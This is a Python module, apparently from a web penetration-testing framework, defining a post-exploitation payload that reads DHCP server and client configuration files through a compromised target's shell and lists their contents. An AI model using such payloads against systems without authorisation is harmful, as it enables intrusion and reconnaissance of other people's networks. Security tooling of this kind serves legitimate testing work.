import re
from plugins.attack.payloads.base_payload import base_payload

class dhcp_config_files(base_payload):
    '''
    This payload shows DHCP Server configuration files
    '''
    def api_read(self):
        result = {}
        files = []

        files.append('/etc/dhcpd.conf')
        files.append('/var/lib/dhcp/dhcpd')
        files.append('/etc/dhcp3/dhclient.conf')
        files.append('/etc/dhclient.conf')
        files.append('/usr/local/etc/dhcpd.conf')

        for file in files:
            content = self.shell.read(file)
            if content:
                result.update({file:content})
        return result
    
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('DHCP Config Files')
            for file, content in hashmap.iteritems():
                result.append('-------------------------')
                result.append(file)
                result.append('-------------------------')
                result.append(content)
        
        if result == [ ]:
            result.append('DHCP configuration files not found.')
        return result
        
